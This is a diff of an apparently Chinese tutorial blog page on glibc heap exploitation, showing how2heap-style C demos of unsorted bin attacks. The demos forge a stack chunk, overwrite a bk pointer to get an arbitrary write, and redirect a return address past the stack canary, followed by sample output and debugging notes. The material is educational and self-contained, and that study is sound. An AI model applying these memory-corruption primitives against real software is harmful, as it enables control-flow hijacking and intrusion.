+	stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;
+
+	<span class="hljs-comment">//------------VULNERABILITY-----------</span>
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);
+	victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;
+	victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span>
+	<span class="hljs-comment">//------------------------------------</span>
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);
+	<span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);
+
+	<span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span>
+	<span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span>
+
+	assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);
+&#125;</code></pre>
+<pre><code class="hljs c">分配victim chunk
+分配另一个chunk防止与top chunk合并
+释放victim chunk:<span class="hljs-number">0x1ef8420</span>时，它将被插入unsorted bin中
+在栈上创建一个fake chunk用于下一次分配和指向任意可写地址的bk指针，模拟一个可以覆盖victim-&gt;size和victim-&gt;bk指针的漏洞
+Size应该与下一个返回fake_chunk的请求大小不同，需要通过检查 <span class="hljs-number">2</span>*SIZE_SZ (&gt; <span class="hljs-number">16</span> on x64) &amp;&amp; &lt; av-&gt;system_mem\n
+现在，下一个<span class="hljs-built_in">malloc</span>将返回我们的假块的区域:<span class="hljs-number">0x7ffd5a615840</span>
+<span class="hljs-built_in">malloc</span> (<span class="hljs-number">0x100</span>): <span class="hljs-number">0x7ffd5a615840</span>
+Nice jump d00d</code></pre>
 <h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>首先分配两个堆块</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243129.png" alt="image-20220114173311530"></p>
 <p>然后free掉第一个chunk</p>
@@ -176,8 +379,52 @@
 </blockquote>
 <h3 id="unsorted-bin-attack-2"><a href="#unsorted-bin-attack-2" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>如果我们只是想修改某块内存的值，而不是获得内存的控制权， 那么就可以使用unsorted bin attack。该技术并不要求在目标内存 伪造fake chunk，因此使用起来更加方便，通常是为进一步的攻击做 准备的，例如泄露libc地址，或者修改全局变量global_max_fast， 使更大的chunk被视为fastbin，从而做一些fastbin attack。</p>
 <p> 我们知道unsorted bin是一个双向链表，在分配时会通过特殊的 unlink操作从链表中移除chunk，所以如果能够控制chunk的bk指 针，就可以达到任意位置写入。</p>
-<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>		   <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>	<span class="hljs-built_in">free</span>(p);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br>		   <span class="hljs-string">&quot;point to %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>	<span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>	p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>	<span class="hljs-comment">//------------------------------------</span><br><br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span><br>		   <span class="hljs-string">&quot;rewritten:\n&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>&#125;<br></code></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">这个程序演示了将一个大的无符号长值写入堆栈的unsorted bin攻击<br>在实践中，unsorted bin攻击通常会为进一步的攻击做好准备，例如在libc中重写全局变量global_max_fast以应对进一步的fastbin攻击<br>让我们先看看我们想要在堆栈上重写的目标:<br><span class="hljs-number">0x7fff6e841948</span>: <span class="hljs-number">0</span><br>现在，我们在堆上分配第一个普通块:<span class="hljs-number">0x240c010</span><br>并分配另一个普通块，以避免在<span class="hljs-built_in">free</span>()期间将和top chunk合并。<br>我们现在释放第一个块，它将被插入到 unsorted bin中，其bk指针指向<span class="hljs-number">0x7f64787b9b78</span><br>现在模拟一个可以覆盖victim-&gt;bk指针的漏洞<br>我们用目标地址<span class="hljs-number">-16</span>(在<span class="hljs-number">32</span>位机器中，它应该是目标地址<span class="hljs-number">-8</span>)来写它:<span class="hljs-number">0x7fff6e841938</span><br>让我们再次使用<span class="hljs-built_in">malloc</span>来获得刚刚释放的块。在此期间，目标应该已经被重写:<br><span class="hljs-number">0x7fff6e841948</span>: <span class="hljs-number">0x7f64787b9b78</span><br></code></pre></td></tr></table></figure>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span>
+		   <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);
+
+	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);
+
+	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span>
+           <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);
+
+	<span class="hljs-built_in">free</span>(p);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span>
+		   <span class="hljs-string">&quot;point to %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);
+
+	<span class="hljs-comment">//------------VULNERABILITY-----------</span>
+
+	p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);
+
+	<span class="hljs-comment">//------------------------------------</span>
+
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span>
+		   <span class="hljs-string">&quot;rewritten:\n&quot;</span>);
+	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);
+&#125;</code></pre>
+<pre><code class="hljs c">这个程序演示了将一个大的无符号长值写入堆栈的unsorted bin攻击
+在实践中，unsorted bin攻击通常会为进一步的攻击做好准备，例如在libc中重写全局变量global_max_fast以应对进一步的fastbin攻击
+让我们先看看我们想要在堆栈上重写的目标:
+<span class="hljs-number">0x7fff6e841948</span>: <span class="hljs-number">0</span>
+现在，我们在堆上分配第一个普通块:<span class="hljs-number">0x240c010</span>
+并分配另一个普通块，以避免在<span class="hljs-built_in">free</span>()期间将和top chunk合并。
+我们现在释放第一个块，它将被插入到 unsorted bin中，其bk指针指向<span class="hljs-number">0x7f64787b9b78</span>
+现在模拟一个可以覆盖victim-&gt;bk指针的漏洞
+我们用目标地址<span class="hljs-number">-16</span>(在<span class="hljs-number">32</span>位机器中，它应该是目标地址<span class="hljs-number">-8</span>)来写它:<span class="hljs-number">0x7fff6e841938</span>
+让我们再次使用<span class="hljs-built_in">malloc</span>来获得刚刚释放的块。在此期间，目标应该已经被重写:
+<span class="hljs-number">0x7fff6e841948</span>: <span class="hljs-number">0x7f64787b9b78</span></code></pre>
 <h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><p>首先我们分配两个块，第二个块是防止与top chunk合并</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243132.png" alt="image-20220114182748276"></p>
 <p>当 free之后，这个 chunk 的 fd、bk 都指向了 unsorted bin 的位置，因为 unsorted bin 是双向链表</p>
